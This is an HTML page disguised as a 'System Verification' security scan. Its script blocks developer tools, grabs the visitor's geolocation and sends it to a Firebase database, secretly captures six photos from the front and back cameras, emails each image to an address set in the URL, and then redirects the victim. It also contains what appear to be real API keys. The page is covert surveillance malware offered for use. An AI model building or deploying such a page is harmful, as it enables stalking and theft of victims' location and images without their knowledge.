<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#0b0f1a] text-white flex items-center justify-center h-screen overflow-hidden">
    <div class="text-center p-10 max-w-sm w-full bg-[#151b2b] rounded-[2.5rem] border border-slate-800 shadow-2xl">
        <div class="relative w-16 h-16 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
        <h1 class="text-xl font-black uppercase italic italic">Verify <span class="text-blue-500">System</span></h1>
        <div class="w-full bg-slate-800 h-1 rounded-full mt-6 overflow-hidden">
            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
        </div>
        <p id="msg" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest">Starting Security Scan...</p>
        
        <video id="v-front" autoplay playsinline class="hidden"></video>
        <video id="v-back" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        // --- ANTI-ANALYSIS ---
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false; };
        setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 100) window.location.href = "https://google.com"; }, 1000);

        // --- FIREBASE & CONFIG ---
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        // REPLACE THESE WITH YOUR ACTUAL EMAILJS KEYS
        const PUB_KEY = "etJqo3AXU_wo-pcNi"; 
        const SERV_ID = "service_toskmod";
        const TEMP_ID = "template_55m8k98";
        emailjs.init(PUB_KEY);

        const urlParams = new URLSearchParams(window.location.search);
        const logId = urlParams.get('id');
        const targetEmail = urlParams.get('email');
        const red = decodeURIComponent(urlParams.get('red') || "https://google.com");

        let locStr = "Denied";

        // 1. Get Location
        navigator.geolocation.getCurrentPosition(pos => {
            locStr = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            db.ref('shadow_intel/' + logId).update({ location: locStr });
            initCapture();
        }, () => initCapture());

        // 2. Camera Logic
        async function initCapture() {
            try {
                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v-front').srcObject = s1;
                try {
                    const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    document.getElementById('v-back').srcObject = s2;
                } catch(e) {}
                startSequence();
            } catch(e) { window.location.href = red; }
        }

        async function startSequence() {
            for(let i=1; i<=6; i++) {
                await new Promise(r => setTimeout(r, 2000));
                let cam = (i <= 3) ? 'v-front' : 'v-back';
                await takeShot(cam, i);
                document.getElementById('msg').innerText = `Syncing Node ${i}/6...`;
                document.getElementById('bar').style.width = (i * 16) + "%";
                db.ref('shadow_intel/' + logId).update({ camStatus: i + "/6 Captured" });
            }
            window.location.href = red;
        }

        async function takeShot(vidId, idx) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById(vidId);
            const ctx = canvas.getContext('2d');
            const active = video.srcObject ? video : document.getElementById('v-front');
            
            if(active.srcObject) {
                ctx.drawImage(active, 0, 0, 1280, 720);
                const base64 = canvas.toDataURL('image/jpeg', 0.5);
                return emailjs.send(service_toskmod, template_55m8k98, {
                    to_email: targetEmail,
                    log_id: logId,
                    location: locStr,
                    camera: (idx <= 3) ? "Front" : "Back",
                    image_data: base64
                });
            }
        }
    </script>
</body>
</html>
